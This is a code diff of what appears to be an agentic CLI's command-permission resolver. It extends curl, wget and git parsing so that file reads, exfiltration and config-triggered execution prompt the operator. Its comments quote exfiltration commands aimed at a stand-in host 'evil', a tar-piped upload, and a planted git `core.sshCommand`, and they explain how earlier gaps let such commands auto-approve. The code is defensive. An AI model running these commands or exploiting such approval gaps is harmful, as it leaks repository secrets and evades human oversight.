@@ -50,9 +50,12 @@ import {
   classifyProtectedPath,
   isGlobSafeRunCarveout,
   protectedTargets,
+  startsWithSegment,
 } from '../protected_paths.ts';
+import { matchSensitivePath } from '../sensitive-paths.ts';
 import { expandTilde } from '../tilde.ts';
 import {
+  type ConservativeCause,
   type Resolver,
   type ResolverContext,
   type ResolverResult,
@@ -515,6 +518,12 @@ type CommandResolver = (
   positional: string[],
   allTokens: readonly string[],
   ctx: ResolverContext,
+  // The resolved command basename (the COMMAND_TABLE key). Most resolvers ignore
+  // it; `cmdCurlWget` needs it to disambiguate flags that mean different things
+  // in curl vs wget — `-b` is curl's cookie-file but wget's `--background`. A
+  // resolver that omits this param still satisfies the type (TS structural
+  // typing lets a shorter function stand in), so existing resolvers are untouched.
+  name: string,
 ) => CommandResolverResult;
 
 const cmdRead: CommandResolver = (positional, _tokens, ctx) => {
@@ -1490,10 +1499,19 @@ const cmdMvCp: CommandResolver = (positional, tokens, ctx) => {
   };
 };
 
-const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
+const cmdCurlWget: CommandResolver = (positional, tokens, ctx, name) => {
   if (tokens.some((t) => t === '--proxy' || t === '-x')) {
     return { refuse: 'curl/wget: proxy-shaped flags suggest evasion' };
   }
+  // curl and wget SHARE this resolver but their SHORT flags diverge: `-E` is
+  // curl's `--cert` (a file path) but wget's `--adjust-extension` (a boolean);
+  // `-T` is curl's `--upload-file` but wget's `--timeout` (seconds); `-K` is
+  // curl's `--config` but wget's `--backup-converted` (boolean). Applying curl's
+  // value-consuming reading to wget would swallow the URL / a number as a bogus
+  // file READ — and under autonomous a read below cwd + the egress trips
+  // `hasUploadShape`, so a plain `wget -E`/`-T`/`-K` fetch would wrongly prompt.
+  // Gate those short forms on `isCurl`; wget's own material rides its long forms.
+  const isCurl = name === 'curl';
   // Detect `-o <path>` / `--output <path>` (curl) and `-O` /
   // `--output-document` (wget); also support combined-form
   // `-o<path>` and `--output=<path>` shapes (slice 98, R2 #200).
@@ -1525,10 +1543,56 @@ const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
     { longForm: '--trace-ascii' },
   ];
   const CURL_READ_PATH_SPECS: readonly { longForm: string; shortForm?: string }[] = [
-    { longForm: '--upload-file', shortForm: '-T' },
-    { longForm: '--config', shortForm: '-K' },
+    // `-T`/`-K` are curl-only (wget `-T` is a TIMEOUT number, `-K` is a boolean) —
+    // gate the short form so wget's operand isn't misread as an upload/config file.
+    { longForm: '--upload-file', ...(isCurl ? { shortForm: '-T' } : {}) },
+    { longForm: '--config', ...(isCurl ? { shortForm: '-K' } : {}) },
     { longForm: '--netrc-file' },
     { longForm: '--cacert' },
+    // TLS / auth MATERIAL — a repo private key or client cert read here must
+    // emit `read-fs` so the read SURFACES instead of leaving silently: under
+    // autonomous a sensitive `id_rsa`/`*.pem`/`*.key` fails `capDevLoopConfined`
+    // (`matchSensitivePath`) and re-arms the modal, and under bypass the §11
+    // protected/sensitive floor denies it outright. Pre-fix these emitted only
+    // `net-egress`, so `curl --key src/id_rsa https://x` auto-approved. A
+    // non-sensitive cert still surfaces as an upload-shaped confirm (its bytes
+    // ARE presented on the handshake). `-E`/`--cert` takes `<cert[:password]>`
+    // and is handled separately below (the `:password` suffix must be stripped);
+    // the rest are plain paths.
+    { longForm: '--key' },
+    { longForm: '--pubkey' },
+    { longForm: '--proxy-cert' },
+    { longForm: '--proxy-key' },
+    { longForm: '--proxy-cacert' },
+    // wget TLS MATERIAL — wget's own spellings for the same class curl models via
+    // `--cert`/`--key`/`--cacert` above (curl has none of these, so applying them
+    // to curl matches nothing — safe). Without them `wget --certificate=src/client.pem
+    // --private-key=src/id.key https://x` read the repo key/cert with only
+    // net-egress emitted, skipping the sensitive-file / upload gate. `--certificate`
+    // and `--private-key` are the sensitive client material; `--ca-certificate` /
+    // `--crl-file` are CA bundles (still repo-file reads worth surfacing).
+    { longForm: '--certificate' },
+    { longForm: '--private-key' },
+    { longForm: '--ca-certificate' },
+    { longForm: '--crl-file' },
+    // wget upload forms: `--post-file=FILE` / `--body-file=FILE` read a local
+    // file into the request body (the wget analogue of curl `-d @file`). Without
+    // these the emitted caps were `net-egress` ALONE, so `hasUploadShape` (which
+    // needs a repo file read alongside the egress) saw a plain fetch and the
+    // autonomous posture auto-approved the exfil.
+    { longForm: '--post-file' },
+    { longForm: '--body-file' },
+  ];
+  // `-E`/`--cert <cert[:password]>` — same read as the specs above, but a
+  // trailing `:password` must be stripped so the emitted path is the cert file,
+  // not `cert.pem:secret`. Strip at the FIRST `:` (the path is what matters for
+  // the read; over-stripping under-reports, which the specs never do — here we
+  // keep the leading path segment).
+  const CURL_CERT_SPECS: readonly { longForm: string; shortForm?: string }[] = [
+    // `-E` is curl's `--cert`; for wget `-E` is `--adjust-extension` (a boolean),
+    // so gating the short form stops `wget -E https://x` consuming the URL as a
+    // fake cert path (an in-repo read that would then trip `hasUploadShape`).
+    { longForm: '--cert', ...(isCurl ? { shortForm: '-E' } : {}) },
   ];
   const writeTargets: string[] = [];
   const readTargets: string[] = [];
@@ -1540,6 +1604,13 @@ const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
   for (const spec of CURL_READ_PATH_SPECS) {
     for (const v of extractValueFlag(tokens, spec)) {
       if (v !== '-') readTargets.push(v);
+    }
+  }
+  for (const spec of CURL_CERT_SPECS) {
+    for (const v of extractValueFlag(tokens, spec)) {
+      const colon = v.indexOf(':');
+      const path = colon === -1 ? v : v.slice(0, colon); // drop `:password`
+      if (path.length > 0 && path !== '-') readTargets.push(path);
     }
   }
 
@@ -1572,11 +1643,19 @@ const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
     //
     // `--form` / `-F` is similar but its `@`/`<` shape is part of
     // a `key=@<file>` / `key=<@file>` value; handled below.
+    // Flags whose value is `@<path>` → read the file. Besides the POST-body
+    // flags, `-H`/`--header` reads a header line PER line of the file, `--json`
+    // reads the JSON body from a file — both are exfil channels the same way
+    // `-d @file` is (a repo file leaves in the request). An inline value
+    // (`-H "X: Y"`, `--data foo`) has no leading `@` and reads nothing.
     const dataBodyFlags: ReadonlySet<string> = new Set([
       '--data',
       '--data-binary',
       '--data-ascii',
       '-d',
+      '--header',
+      '-H',
+      '--json',
     ]);
     // `--data=@<path>` / `-d=@<path>` (combined form). curl doesn't
     // officially document the `=` shape for short `-d`, but some
@@ -1592,6 +1671,22 @@ const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
     } else if (t.startsWith('--data-ascii=')) {
       combinedFlag = '--data-ascii';
       combinedValue = t.slice('--data-ascii='.length);
+    } else if (t.startsWith('--header=')) {
+      combinedFlag = '--header';
+      combinedValue = t.slice('--header='.length);
+    } else if (t.startsWith('--json=')) {
+      combinedFlag = '--json';
+      combinedValue = t.slice('--json='.length);
+    } else if (t.length > 2 && t[0] === '-' && (t[1] === 'd' || t[1] === 'H')) {
+      // ATTACHED short form `-d@<path>` / `-H@<path>` (curl attaches a short
+      // option's value directly). Without this the `@`-file read was invisible
+      // and `curl -d@src/secret evil` / `curl -H@src/secret evil` posted a repo
+      // file with only net-egress emitted — auto-approved under autonomous.
+      // `-dfoo`/`-HAccept:x` (inline) has no `@` and reads nothing, correctly. A
+      // leading `=` (`-d=@x`) is stripped so the wrapper form is covered too.
+      combinedFlag = `-${t[1]}`;
+      const v = t.slice(2);
+      combinedValue = v.startsWith('=') ? v.slice(1) : v;
     }
     if (combinedFlag !== null && combinedValue !== null) {
       if (combinedValue.startsWith('@') && combinedValue.length > 1) {
@@ -1611,13 +1706,14 @@ const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
       }
       continue;
     }
-    // `--data-urlencode` has TWO file-bearing shapes per curl docs:
-    //   --data-urlencode @file         (urlencode whole file)
-    //   --data-urlencode name@file     (urlencode file as name=value)
+    // `--data-urlencode` and `--url-query` have TWO file-bearing shapes per
+    // curl docs:
+    //   @file         (urlencode/query whole file)
+    //   name@file     (urlencode/query file as name=value)
     // Both expand the file at `@`'s position. The bare-name shape
-    // `--data-urlencode foo=bar` does NOT read a file. Decode both
-    // file shapes; ignore the others.
-    if (t === '--data-urlencode') {
+    // `foo=bar` does NOT read a file. Decode both file shapes; ignore the
+    // others. `--url-query` (curl 7.87+) mirrors `--data-urlencode`'s syntax.
+    if (t === '--data-urlencode' || t === '--url-query') {
       const next = tokens[i + 1];
       if (next !== undefined && !next.startsWith('-')) {
         if (next.startsWith('@') && next.length > 1) {
@@ -1632,8 +1728,8 @@ const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
       }
       continue;
     }
-    if (t.startsWith('--data-urlencode=')) {
-      const value = t.slice('--data-urlencode='.length);
+    if (t.startsWith('--data-urlencode=') || t.startsWith('--url-query=')) {
+      const value = t.slice(t.indexOf('=') + 1);
       if (value.startsWith('@') && value.length > 1) {
         readTargets.push(value.slice(1));
       } else {
@@ -1657,6 +1753,10 @@ const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
       }
     } else if (t.startsWith('--form=')) {
       formValue = t.slice('--form='.length);
+    } else if (t.length > 2 && t[0] === '-' && t[1] === 'F') {
+      // ATTACHED short form `-F<key>=@<path>` — same file-read shape as the
+      // spaced `-F key=@path`, missed by the exact-token check above.
+      formValue = t.slice(2);
     }
     if (formValue !== null) {
       const eqIdx = formValue.indexOf('=');
@@ -1674,32 +1774,213 @@ const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
         }
       }
     }
+    // COOKIE-FILE reads — a repo file whose contents leave on the request.
+    //   wget `--load-cookies FILE` / `--load-cookies=FILE` — always a file
+    //     (wget-only flag, so no curl ambiguity).
+    //   curl `-b`/`--cookie <data|filename>` — curl treats a value WITHOUT `=`
+    //     as a filename to read cookies from (a `name=value` is inline). `-b` is
+    //     GATED on name==='curl' because wget's `-b` is `--background` (its value
+    //     would be the URL, not a file); `--cookie` is curl-only, so safe.
+    if (t === '--load-cookies') {
+      const next = tokens[i + 1];
+      if (next !== undefined && !next.startsWith('-')) {
+        readTargets.push(next);
+        i += 1;
+      }
+      continue;
+    }
+    if (t.startsWith('--load-cookies=')) {
+      readTargets.push(t.slice('--load-cookies='.length));
+      continue;
+    }
+    const cookieSpaced = t === '--cookie' || (isCurl && t === '-b');
+    if (cookieSpaced) {
+      const next = tokens[i + 1];
+      if (next !== undefined && !next.startsWith('-')) {
+        if (!next.includes('=')) readTargets.push(next); // no `=` → filename
+        i += 1;
+      }
+      continue;
+    }
+    if (t.startsWith('--cookie=')) {
+      const v = t.slice('--cookie='.length);
+      if (!v.includes('=')) readTargets.push(v);
+      continue;
+    }
+    if (isCurl && t.length > 2 && t[0] === '-' && t[1] === 'b') {
+      const v = t.slice(2); // attached `-b<value>`
+      if (!v.includes('=')) readTargets.push(v);
+    }
   }
   const urlToken = positional[0];
   const writeCaps = writeTargets.map((p) => writeFs(resolveArg(p, ctx)));
   // Slice 128 (R4 P1-Launder): include the new read targets in the
   // emitted capability set so the engine's per-arg classifier sees
-  // them.
-  const readCaps = readTargets.map((p) => readFs(resolveArg(p, ctx)));
+  // them. Drop `-`: in curl a `@-` body reads STDIN, not a file named `-`
+  // (the path-flag specs already filter `-`; the `@`-decode must too, or
+  // `curl -d @-` false-positives as an upload of a repo file).
+  const readCaps = readTargets.filter((p) => p !== '-').map((p) => readFs(resolveArg(p, ctx)));
+  // curl/wget egress is EXPLICIT (the command's user-invoked purpose), like
+  // ssh/scp — not incidental to a build. Two consumers key on this: the sandbox
+  // build-egress trust-gate (sandbox-plan.ts, only when an exec:arbitrary rides
+  // along — the mixed-shell demotion re-gates it next to a local arbitrary exec),
+  // and `hasUploadShape` (engine.ts), which treats an explicit network tool
+  // reading ANY repo file — including the root via a pipe like
+  // `tar -cf - . | curl -T -` — as an upload, where a dep-manager's incidental
+  // registry egress + a root read (its manifest scan) is not.
   if (urlToken === undefined) {
     return {
-      capabilities: [netEgress('*'), ...writeCaps, ...readCaps],
+      capabilities: [netEgress('*', true), ...writeCaps, ...readCaps],
       confidence: 'medium',
     };
   }
   try {
     const host = new URL(urlToken).hostname.toLowerCase();
     return {
-      capabilities: [netEgress(host || '*'), ...writeCaps, ...readCaps],
+      capabilities: [netEgress(host || '*', true), ...writeCaps, ...readCaps],
       confidence: 'high',
     };
   } catch {
     return {
-      capabilities: [netEgress('*'), ...writeCaps, ...readCaps],
+      capabilities: [netEgress('*', true), ...writeCaps, ...readCaps],
       confidence: 'medium',
     };
   }
 };
+
+// Walk short-flag BUNDLES (`-df`, `-fd`) and report whether any DESTRUCTIVE
+// letter appears. An exact-token check (`t === '-d'`) misses `git branch -df`
+// (delete + force), which git accepts as a forced ref deletion — under
+// autonomous that auto-approved, bypassing the modal. A value-consuming flag
+// ENDS the bundle (the rest of the token is its argument, not more flags), so
+// `git branch -uorigin/main` (set-upstream-to "origin/main") isn't misread as a
+// bundle containing the destructive letters in the branch name. Destructive is
+// checked before the value-break, so a flag that is BOTH (switch `-C`
+// force-create) still counts. Mirrors the `git tag` bundle walk; long
+// `--force`/`--delete` forms are matched by the caller as exact tokens.
+const bundleHasDestructiveFlag = (
+  tokens: readonly string[],
+  destructive: ReadonlySet<string>,
+  valueConsuming: ReadonlySet<string>,
+): boolean => {
+  for (const t of tokens) {
+    if (t.length < 2 || t[0] !== '-' || t[1] === '-') continue; // not a short bundle
+    for (let i = 1; i < t.length; i++) {
+      const c = t[i] as string;
+      if (destructive.has(c)) return true;
+      if (valueConsuming.has(c)) break; // rest of the token is this flag's value
+    }
+  }
+  return false;
+};
+
+// A `git <repository>` operand that points at a LOCAL filesystem repo — git
+// reads its objects, a read OUTSIDE the workspace that must emit `read-fs` so
+// the autonomous gate (outside-cwd → modal) and the bypass §11 floor see it.
+// Returns the path, or null for a network URL / scp-like `[user@]host:path` / a
+// bare NAMED remote (`origin`). No regex (policy rule) — scheme + shape by
+// prefix/index. A local path needing a `:` must be `./`-prefixed, matching git's
+// own disambiguation (`./a:b` is local, `a:b` is scp-like).
+const GIT_NETWORK_SCHEMES = [
+  'https://',
+  'http://',
+  'git://',
+  'ssh://',
+  'ftp://',
+  'ftps://',
+  'git+ssh://',
+] as const;
+const gitRepoLocalPath = (op: string): string | null => {
+  // `file://` is ALWAYS local in git — the authority/host is IGNORED, not a
+  // network target (`git ls-remote file://anyhost/abs/repo.git` reads
+  // /abs/repo.git; verified against `file:///…`, `file://localhost/…`, and a
+  // bogus `file://otherhost/…`, all exit 0). Parse with URL semantics: a bare
+  // `op.slice('file://'.length)` turned `file://localhost/tmp/r.git` into the
+  // RELATIVE `localhost/tmp/r.git`, which `resolveArg` then rebased INSIDE cwd —
+  // hiding an outside-workspace read from the autonomous modal. `URL.pathname`
+  // is always absolute for the file scheme (host stripped for empty/localhost,
+  // and even a non-local host leaves the path absolute), so the outside-cwd gate
+  // always sees the real target. On a malformed URL, fall through to null.
+  if (op.startsWith('file://')) {
+    try {
+      return new URL(op).pathname;
+    } catch {
+      return null;
+    }
+  }
+  if (GIT_NETWORK_SCHEMES.some((s) => op.startsWith(s))) return null;
+  if (op.startsWith('/') || op.startsWith('./') || op.startsWith('../') || op.startsWith('~')) {
+    return op;
+  }
+  const colon = op.indexOf(':');
+  const slash = op.indexOf('/');
+  if (colon !== -1 && (slash === -1 || colon < slash)) return null; // [user@]host:path
+  if (slash !== -1) return op; // relative local path (`some/dir.git`)
+  return null; // bare word → a named remote (`origin`)
+};
+
+// git `fetch` / `ls-remote` place the repository operand AFTER their options,
+// several of which take a SEPARATE spaced value (`--depth 1 <repo>`,
+// `--sort <key> <repo>`). The top-level `stripFlags` runs with no value set, so
+// those values leak into the positional list: a bare-word/number value (a rev,
+// ref, count, sort key) lands at index 1 and MASKS the real local-repo operand
+// at index 2 — the outside-cwd read is never emitted and autonomous auto-approves
+// a fetch that reads a repository outside the workspace. Re-run `stripFlags` with
+// each subcommand's own value options before selecting the repository. Only
+// REQUIRED-value options belong here; `--recurse-submodules[=…]` is optional-value
+// (spaced form does not consume) and must stay OUT, or it would swallow the repo.
+const GIT_FETCH_VALUE_FLAGS: ReadonlySet<string> = new Set([
+  '--upload-pack',
+  '-j',
+  '--jobs',
+  '--depth',
+  '--shallow-since',
+  '--shallow-exclude',
+  '--deepen',
+  '--refmap',
+  '-o',
+  '--server-option',
+  '--negotiation-tip',
+  '--filter',
+]);
+const GIT_LS_REMOTE_VALUE_FLAGS: ReadonlySet<string> = new Set([
+  '--upload-pack',
+  '--sort',
+  '-o',
+  '--server-option',
+]);
+
+// Caps for a git op that CONTACTS a remote (fetch / ls-remote / remote
+// update|prune|show|set-head --auto). Contacting the remote runs whatever the
+// repo-local `.git/config` names for the transport — `core.sshCommand` (ssh
+// URLs), `core.gitProxy` (git://), `credential.helper` (http auth) — any of which
+// may be `!<shell>`. The sandbox masks the GLOBAL gitconfig's exec knobs but
+// DELIBERATELY leaves the repo `.git/config` UNMASKED and winning
+// (`sandbox-git-identity.ts`), so a hostile clone's config executes on a plain
+// `git fetch origin` — verified: `core.sshCommand` fires on fetch, ls-remote, and
+// `remote show|update|prune`. Same covert-exec-by-config class as `git commit`
+// hooks and `git tag -s`/`-a`: emit `exec:arbitrary` AND mark the git-write
+// `destructive`, because the autonomous posture stopped gating `exec:arbitrary`
+// alone — the `destructive` flag is what holds the modal. For the pure-QUERY ops
+// (ls-remote, `remote show`) the git-write writes no ref; it carries only that
+// modal-hold semantics, the same overload the exec-backed `git tag -s` uses (a
+// typed covert-exec signal would let those drop the synthetic write — the
+// registered altitude backstop). `push`/`pull`/`clone` already gate via their own
+// destructive git-write, so they are unaffected.
+const gitRemoteContactCaps = (repo: string): Capability[] => [
+  exec('arbitrary'),
+  gitWrite(repo, true),
+  // EXPLICIT egress: this exec:arbitrary IS the network transport (ssh/proxy),
+  // not a separate local exec that could piggyback on another command's network.
+  // `selectSandboxProfile` drops a plain (incidental) net-egress next to
+  // exec:arbitrary in an untrusted dir (the build-egress trust gate) — which would
+  // plan `git fetch origin` as cwd-rw with NO network and fail it under the sandbox
+  // after the operator approves the modal. Marking it explicit (like ssh/curl/scp)
+  // keeps the network; the mixed-shell demotion still re-gates it when a SEPARATE
+  // local arbitrary exec rides alongside (`git fetch && ./evil`).
+  netEgress('*', true),
+  readFs(repo),
+];
 
 const cmdGit: CommandResolver = (positional, tokens, ctx) => {
   // Slice 128 (R4 P0-Launder-2): `git -c <key>=<value>` sets a
@@ -1817,7 +2098,10 @@ const cmdGit: CommandResolver = (positional, tokens, ctx) => {
           t === '--replace-all',
       );
       if (notPureRead) {
-        return { capabilities: [exec('arbitrary'), readFs(REPO)], confidence: 'medium' };
+        return {
+          capabilities: [exec('arbitrary'), gitWrite(REPO, true), readFs(REPO)],
+          confidence: 'medium',
+        };
       }
       const explicitRead = tokens.some(
         (t) =>
@@ -1837,7 +2121,19 @@ const cmdGit: CommandResolver = (positional, tokens, ctx) => {
       if (explicitRead || positional.length === 2) {
         return { capabilities: [readFs(REPO)], confidence: 'high' };
       }
-      return { capabilities: [exec('arbitrary'), readFs(REPO)], confidence: 'medium' };
+      // A config WRITE is marked `destructive` — not because it deletes, but
+      // because `exec:arbitrary` alone no longer gates under autonomous
+      // (AGENTIC_CLI §8.1) and a config write is not an ordinary arbitrary exec:
+      // it INSTALLS a persistent trigger (`core.sshCommand`, `core.pager`,
+      // `core.hooksPath`, `alias.*`) inside the protected `.git/config`, which
+      // then fires from later commands the gate considers benign — `git fetch`
+      // is auto-approved, and would run the planted `core.sshCommand`. Running
+      // `./deploy.sh` is code the operator already has in the repo; planting a
+      // hook is new persistent authority, so the operator sees it.
+      return {
+        capabilities: [exec('arbitrary'), gitWrite(REPO, true), readFs(REPO)],
+        confidence: 'medium',
+      };
     }
     case 'status':
     case 'log':
@@ -1845,7 +2141,6 @@ const cmdGit: CommandResolver = (positional, tokens, ctx) => {
     case 'show':
     case 'blame':
     case 'rev-parse':
-    case 'remote':
     // Read-only, local (non-network) plumbing/porcelain verbs. Pre-slice
     // these fell through to the `default` branch and got stamped
     // gitWrite + netEgress + low confidence — so a routine `git shortlog`
@@ -1871,6 +2166,29 @@ const cmdGit: CommandResolver = (positional, tokens, ctx) => {
     case 'annotate':
     case 'var':
       return { capabilities: [readFs(REPO)], confidence: 'high' };
+    case 'ls-remote': {
+      // Read-only query: lists a remote's refs, writes nothing. A URL / named
+      // remote is network (`net-egress`); a LOCAL repo operand
+      // (`git ls-remote ../other.git`) is a filesystem read OUTSIDE the workspace
+      // → `read-fs:<path>` so the outside-cwd read re-arms the modal. ls-remote's
+      // value options (`--sort <key>`, `--upload-pack <exec>`, `-o <opt>`) take a
+      // spaced value that the top-level `stripFlags` left in the positional list,
+      // so select the repository from a value-aware re-parse (a bare `--sort key`
+      // value would otherwise sit at index 1 and mask the real local repo).
+      const lsPositional = stripFlags(tokens, GIT_LS_REMOTE_VALUE_FLAGS);
+      const lsRepo = lsPositional[1];
+      const lsLocal = lsRepo !== undefined ? gitRepoLocalPath(lsRepo) : null;
+      if (lsLocal !== null) {
+        // LOCAL repo operand — file/dir transport, no ssh/proxy/credential helper,
+        // so no repo-config transport exec. A pure filesystem read (outside cwd → gated).
+        return {
+          capabilities: [readFs(resolveArg(lsLocal, ctx)), readFs(REPO)],
+          confidence: 'high',
+        };
+      }
+      // REMOTE query — contacts the remote → repo-config transport exec.
+      return { capabilities: gitRemoteContactCaps(REPO), confidence: 'high' };
+    }
     case 'commit':
     case 'merge':
     case 'rebase':
@@ -1882,18 +2200,20 @@ const cmdGit: CommandResolver = (positional, tokens, ctx) => {
       //   rebase      → pre-rebase, post-rewrite (and `--exec <cmd>` runs <cmd>)
       //   cherry-pick → the commit hooks, per replayed commit
       // A repo that ships an installed hook executes that code on a bare
-      // `git commit -m x`, so the honest capability is `exec:arbitrary`,
-      // NOT a repo-confined `git-write` — under autonomous this MUST keep
-      // the modal (exec:arbitrary is never repo-confined). The git-write +
-      // read-fs caps still ride along so the engine's §11 floors stay
-      // honest about the metadata write. `--no-verify` is NOT a safe
-      // downgrade: it bypasses ONLY pre-commit and commit-msg —
-      // prepare-commit-msg and post-commit still run — so honoring it would
-      // re-open the hole for a post-commit hook. (`git -c core.hooksPath=…`
-      // is refused upstream, so there is no "hooks proven absent" path to
-      // model here.)
+      // `git commit -m x`, so the honest capability is `exec:arbitrary`.
+      // `--no-verify` is NOT a safe downgrade: it bypasses ONLY pre-commit
+      // and commit-msg — prepare-commit-msg and post-commit still run — so
+      // honoring it would re-open the hole for a post-commit hook. (`git -c
+      // core.hooksPath=…` is refused upstream, so there is no "hooks proven
+      // absent" path to model here.)
+      //
+      // The `destructive` mark — not `exec:arbitrary` — is what keeps the
+      // modal under autonomous: the posture stopped gating `exec:arbitrary`
+      // (the operator runs `bun install` and `./deploy.sh` hands-off), so
+      // these verbs must declare themselves. They rewrite HISTORY and run
+      // hooks; the operator asked to see them.
       return {
-        capabilities: [exec('arbitrary'), gitWrite(REPO), readFs(REPO)],
+        capabilities: [exec('arbitrary'), gitWrite(REPO, true), readFs(REPO)],
         confidence: 'high',
       };
     case 'tag': {
@@ -1938,34 +2258,257 @@ const cmdGit: CommandResolver = (positional, tokens, ctx) => {
           }
         }
       }
+      // Destructive when it DELETES a ref (`-d`/`--delete`) or FORCE-replaces an
+      // existing tag (`-f`/`--force`) — both lose the old ref target. A
+      // lightweight or annotated CREATE is not. The bundle walk catches `-fa`/
+      // `-df`; `-m`/`-F`/`-u`/`-n` consume the rest of their token, so a message
+      // like `-mf` ("f") isn't misread as force. (`git tag` has no `--force=`
+      // attached form — it is boolean.)
+      const destructiveTag =
+        tokens.some((t) => t === '--delete' || t === '--force') ||
+        bundleHasDestructiveFlag(tokens, new Set(['d', 'f']), new Set(['m', 'F', 'u', 'n']));
       if (usesGpg || (annotated && !hasMessage)) {
+        // Signed/verified (`-s`/`-u`/`-v` → `gpg.program`) or annotated-without-
+        // message (opens `core.editor`) runs a CONFIGURED program on a command
+        // that doesn't look like it runs code — the same covert-exec class as
+        // `git commit`'s hooks, which gate. `exec:arbitrary` alone no longer
+        // holds the modal under autonomous, so mark it `destructive`: the config
+        // naming gpg/editor is benign only in a trusted repo, and directory trust
+        // gates EGRESS not EXEC — an untrusted clone's hostile `gpg.program`
+        // would otherwise run modal-free. (Still destructive if it also
+        // deletes/force-replaces.)
         return {
-          capabilities: [exec('arbitrary'), gitWrite(REPO), readFs(REPO)],
+          capabilities: [exec('arbitrary'), gitWrite(REPO, true), readFs(REPO)],
           confidence: 'high',
         };
       }
-      return { capabilities: [gitWrite(REPO), readFs(REPO)], confidence: 'high' };
+      return { capabilities: [gitWrite(REPO, destructiveTag), readFs(REPO)], confidence: 'high' };
     }
     case 'add':
-    case 'stash':
-    case 'reset':
-      // Pure git-writes with NO hook / editor / gpg surface: git has no
-      // pre-add / reset hook, and `git stash` writes its commits through
-      // plumbing (`commit-tree`/`update-ref`) that bypasses the commit hooks.
-      // These stay repo-confined `git-write` → auto-approvable under autonomous.
+      // No hook / editor / gpg surface and no discard of work: git has no
+      // pre-add hook. Non-destructive `git-write` → auto-approved under autonomous.
       return { capabilities: [gitWrite(REPO), readFs(REPO)], confidence: 'high' };
-    case 'push':
-    case 'pull':
-    case 'fetch':
+    case 'stash': {
+      // `git stash` (push/save) writes through plumbing (`commit-tree`/
+      // `update-ref`) that bypasses the commit hooks AND preserves the working
+      // tree in a ref → recoverable, non-destructive. `pop`/`apply` restore. But
+      // `clear` (drop ALL stashes) and `drop` (drop one) delete stashed work
+      // irrecoverably → destructive. positional[1] is the subcommand (flags
+      // already stripped); bare `git stash` has none → non-destructive.
+      const sub = positional[1];
+      const discardsStash = sub === 'clear' || sub === 'drop';
+      return { capabilities: [gitWrite(REPO, discardsStash), readFs(REPO)], confidence: 'high' };
+    }
+    case 'remote': {
+      // Three shapes, each with different caps:
+      //   • CONFIG WRITE — `add`/`set-url`/`remove`/`rm`/`rename`/`set-branches`/
+      //     `set-head` mutate `.git/config` and can repoint fetch/push at an
+      //     attacker host (a later auto-approved `git fetch` then contacts it):
+      //     persistent-authority, same class as `git config` → `destructive`
+      //     (bash never emits a write to `.git`, so the §11 floor can't catch it —
+      //     the mark is the only gate). Local, no network.
+      //   • REMOTE CONTACT — `update`/`prune` fetch, `show <name>` queries the
+      //     remote heads UNLESS `-n`, `set-head --auto` fetches the remote HEAD.
+      //     These need `net-egress` so the sandbox provisions network (else the
+      //     run lands a no-network profile and fails/under-reports). `prune` also
+      //     DELETES stale tracking refs → destructive; `update`/`show` don't.
+      //   • LOCAL READ — bare, `-v`, `get-url[-all]`, `show -n`, `set-head <br>`:
+      //     read only, no network.
+      const sub = positional[1];
+      const hasN = tokens.some((t) => t === '-n' || t === '--no-query');
+      const auto = tokens.some((t) => t === '-a' || t === '--auto');
+      const mutates =
+        sub === 'add' ||
+        sub === 'set-url' ||
+        sub === 'remove' ||
+        sub === 'rm' ||
+        sub === 'rename' ||
+        sub === 'set-branches' ||
+        sub === 'set-head';
+      const contactsRemote =
+        sub === 'update' ||
+        sub === 'prune' ||
+        (sub === 'show' && !hasN) ||
+        (sub === 'set-head' && auto);
+      if (contactsRemote) {
+        // Contacting the remote runs repo-config transport exec (ssh/proxy/
+        // credential) → gate as covert exec (see `gitRemoteContactCaps`). This
+        // supersedes the plain gitWrite/netEgress the branch used before and
+        // closes the pure-QUERY `show <name>` / `set-head --auto` that emitted
+        // neither destructive nor exec (auto-approved under autonomous). It also
+        // subsumes `update` (fetch-like tracking-ref write) and `prune` (stale-ref
+        // delete): the destructive git-write covers both.
+        return { capabilities: gitRemoteContactCaps(REPO), confidence: 'high' };
+      }
+      // LOCAL-only shapes: a config MUTATION (`add`/`set-url`/`rename`/…) that can
+      // repoint fetch/push at an attacker host is persistent-authority →
+      // destructive (bash never emits a `.git` write, so the mark is the only
+      // gate). A bare/`-v`/`get-url`/`show -n`/`set-head <branch>` is a pure read.
+      const caps: Capability[] = [];
+      if (mutates) caps.push(gitWrite(REPO, true));
+      caps.push(readFs(REPO));
+      return { capabilities: caps, confidence: 'high' };
+    }
+    case 'reset':
+      // `git reset <path>` (unstage) and a soft/mixed reset move HEAD/index and
+      // leave the working tree intact. `--hard` DISCARDS uncommitted work;
+      // `--merge` / `--keep` also overwrite tracked files. Split them: the
+      // operator asked to see the discards, not every unstage.
       return {
-        capabilities: [gitWrite(REPO), netEgress('*'), readFs(REPO)],
+        capabilities: [
+          gitWrite(
+            REPO,
+            tokens.some((t) => t === '--hard' || t === '--merge' || t === '--keep'),
+          ),
+          readFs(REPO),
+        ],
         confidence: 'high',
       };
-    case 'clean':
-      if (tokens.some((t) => /^-f/.test(t))) {
-        return { capabilities: [deleteFs(REPO), gitWrite(REPO)], confidence: 'high' };
+    case 'push':
+    case 'pull':
+      // Network + history. `pull` = fetch + merge, so it runs the merge hooks
+      // too. Both are on the operator's confirm list.
+      return {
+        capabilities: [gitWrite(REPO, true), netEgress('*'), readFs(REPO)],
+        confidence: 'high',
+      };
+    case 'fetch': {
+      // A REMOTE fetch (`git fetch`, `git fetch origin`, a URL) contacts the
+      // remote and therefore runs the repo-config transport program → it now gates
+      // under autonomous via `gitRemoteContactCaps` (below), like commit/tag/pull/
+      // push/clone. The `force`/destructive detection here governs the LOCAL-repo
+      // branch only (`git fetch ../other.git`), which touches neither the working
+      // tree nor branch history — it only updates remote-tracking refs — and is
+      // Destructive solely when it FORCE-overwrites a LOCAL ref (discarding
+      // commits) or clobbers LOCAL tags:
+      //   • `-f`/`--force`, or a refspec with a leading `+` (`+main:main`,
+      //     `+refs/heads/*:refs/heads/*`) — a `+` can only lead a refspec
+      //     positional (options start with `-`). The same `+` can also ride
+      //     INSIDE a `--refmap` value (`--refmap=+refs/heads/x:refs/heads/y`),
